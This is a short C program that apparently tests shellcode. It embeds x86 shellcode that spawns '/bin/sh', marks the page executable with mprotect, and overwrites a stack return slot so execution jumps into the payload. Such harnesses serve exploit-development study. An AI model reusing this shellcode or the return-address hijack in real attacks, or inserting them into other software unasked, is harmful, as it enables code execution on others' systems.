#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>

//const char shellcode[] = "\x48\x89\xe5\x48\x8d\x05\x00\x00\x00\x00\x48\x89\xc7\xe8\x00\x00\x00\x00\x90\x5d";

const char shellcode[]="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";





int main(void)

{

  uintptr_t pagesize = sysconf(_SC_PAGESIZE);

  if (mprotect((void *)(((uintptr_t)shellcode) & ~(pagesize - 1)),

               pagesize, PROT_READ|PROT_EXEC)) {

    perror("mprotect");

    return 1;

  }



  void **ret;

  ret = (void **) &ret;

  ret[9] = (void *)shellcode;



  return 0;

}
